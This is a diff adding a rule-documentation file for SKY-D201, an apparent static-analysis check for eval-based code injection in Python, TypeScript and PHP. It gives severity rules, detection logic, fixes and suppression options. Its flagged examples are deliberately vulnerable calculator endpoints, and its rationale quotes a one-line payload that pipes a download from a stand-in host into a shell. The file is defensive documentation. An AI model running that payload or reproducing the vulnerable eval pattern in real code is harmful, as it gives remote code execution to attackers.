@@ -1,0 +1,187 @@
+id: SKY-D201
+title: Dynamic code execution with eval
+family: security
+severity: HIGH
+severity_note: >-
+  Python findings are HIGH. TypeScript and JavaScript `eval()` is reported as
+  CRITICAL. In PHP, request data reaching `eval()`, `create_function()` or a
+  `preg_replace()` with the `/e` modifier is CRITICAL; other non-constant
+  code, and `assert()` of request data, is HIGH.
+languages: [Python, TypeScript/JavaScript, PHP]
+gate:
+  full: critical_blocks
+  note: >-
+    Python findings are HIGH and only counted. A Python call whose code is
+    fixed text is hidden from the default list but still counted.
+cwe: [CWE-95]
+
+what_it_is: >-
+  `eval()` takes a string and runs it as code. SKY-D201 reports `eval()`
+  calls whose code is not proven to be fixed text, plus the PHP functions
+  that do the same job.
+
+why_it_matters: >-
+  A calculator endpoint that runs `eval(request.args["expr"])` will also run
+  `__import__("os").system("curl evil.example | sh")` when a visitor types it.
+  That gives the visitor the same rights on the server as the application.
+
+flagged_example:
+  language: python
+  filename: app/calc.py
+  expect_line: 9
+  code: |
+    from flask import Flask, request
+
+    app = Flask(__name__)
+
+
+    @app.get("/calc")
+    def calc():
+        expression = request.args.get("expr", "0")
+        result = eval(expression)
+        return {"result": result}
+
+not_flagged_example:
+  language: python
+  filename: app/calc.py
+  code: |
+    import ast
+
+    from flask import Flask, request
+
+    app = Flask(__name__)
+
+
+    @app.get("/calc")
+    def calc():
+        expression = request.args.get("expr", "[]")
+        values = ast.literal_eval(expression)
+        return {"total": sum(values)}
+  why: >-
+    `ast.literal_eval()` only accepts literals such as numbers, strings,
+    lists and dicts, and never calls a function. Skylos matches the builtin
+    `eval` by its resolved name, so a different function that merely ends in
+    `eval` is not a match.
+
+more_examples:
+  - flagged:
+      language: typescript
+      filename: src/calc.ts
+      expect_line: 7
+      code: |
+        import express from "express";
+
+        const app = express();
+
+        app.get("/calc", (req, res) => {
+          const expression = String(req.query.expr ?? "0");
+          res.json({ result: eval(expression) });
+        });
+    not_flagged:
+      language: typescript
+      filename: src/calc.ts
+      code: |
+        import express from "express";
+
+        const app = express();
+
+        app.get("/calc", (req, res) => {
+          const values: number[] = JSON.parse(String(req.query.values ?? "[]"));
+          res.json({ total: values.reduce((sum, value) => sum + value, 0) });
+        });
+      why: >-
+        `JSON.parse()` turns text into data and cannot run code. In
+        TypeScript and JavaScript every call to the global `eval` is
+        reported, whatever its argument.
+
+how_skylos_decides:
+  - >-
+    Python: resolves each call's name through imports and simple
+    assignments, including a builtin stored in a variable (`run = eval`),
+    and matches the builtin `eval`. Methods called `eval` on other objects do
+    not match.
+  - >-
+    Skips a call proved to run the project's own checked-in source: a module
+    file under the project, located from `__file__`, read, parsed with
+    `ast.parse`, compiled and run in a fresh namespace dict. Any other step
+    in that chain keeps the call reported.
+  - >-
+    Reports the rest as HIGH. When every value that can reach the code
+    argument is fixed text that reads no outside name (for example
+    `eval("60 * 60 * 24")`), the finding is still reported but marked as
+    low-risk: it is hidden from the default list, stays in JSON output and
+    is counted by the gate.
+  - >-
+    TypeScript and JavaScript: every call to the global `eval(...)` is
+    reported as CRITICAL. There is no constant-argument exception.
+  - >-
+    PHP: `eval()`, `create_function()` and `preg_replace()` with the `/e`
+    modifier are CRITICAL when request data reaches the code and HIGH when
+    the code is any other non-constant value; `assert()` is reported (HIGH)
+    only for request data. Fixed code is not reported.
+
+source_refs:
+  - path: skylos/rules/danger/calls.py
+    symbol: "DANGEROUS_CALLS = {"
+    note: the Python sink table; `eval` is SKY-D201.
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _call_findings("
+    note: the skip order, including source-owned code.
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _constant_argument_proved("
+    note: when fixed code is marked low-risk.
+  - path: skylos/rules/danger/source_owned_code.py
+    symbol: "def source_owned_code_calls("
+  - path: skylos/reporting/listing.py
+    symbol: "LOW_RISK_REASONS = {"
+    note: which low-risk reasons hide a finding from the default list.
+  - path: skylos/visitors/languages/typescript/danger.py
+    symbol: "_SIMPLE_MAP: dict[str, tuple[str, str, str]] = {"
+  - path: skylos/visitors/languages/php/danger.py
+    symbol: "def check_code_sinks("
+
+fix:
+  explanation: >-
+    Parse data with a parser that cannot run code, such as
+    `ast.literal_eval()` or `json.loads()`. For real formulas, use a small
+    expression library with a fixed set of operators instead of `eval()`.
+  filename: app/calc.py
+  code: |
+    import json
+
+    from flask import Flask, request
+
+    app = Flask(__name__)
+
+
+    @app.get("/calc")
+    def calc():
+        values = json.loads(request.args.get("values", "[]"))
+        return {"total": sum(float(value) for value in values)}
+
+false_alarms_and_suppression:
+  misfires:
+    - >-
+      In TypeScript and JavaScript, `eval("1 + 1")` with a literal is
+      reported as CRITICAL, although it cannot carry input.
+    - >-
+      In Python, a fixed-text `eval()` still counts toward the gate even
+      though the default list hides it.
+  suppress:
+    - check: inline
+      text: >-
+        Mark a reviewed call on its own line. A bare `# noqa` does not hide
+        a HIGH or CRITICAL security finding.
+      language: python
+      code: |
+        result = eval(expression)  # skylos: ignore[SKY-D201] expression is from FORMULAS
+    - check: baseline
+      text: >-
+        Accept existing findings with `skylos baseline .`, then scan with
+        `--baseline`.
+    - check: config
+      text: >-
+        `[tool.skylos] ignore = ["SKY-D201"]` turns the rule off for the
+        whole project.
+
+related: [SKY-D202, SKY-D245, SKY-D349, SKY-D200]
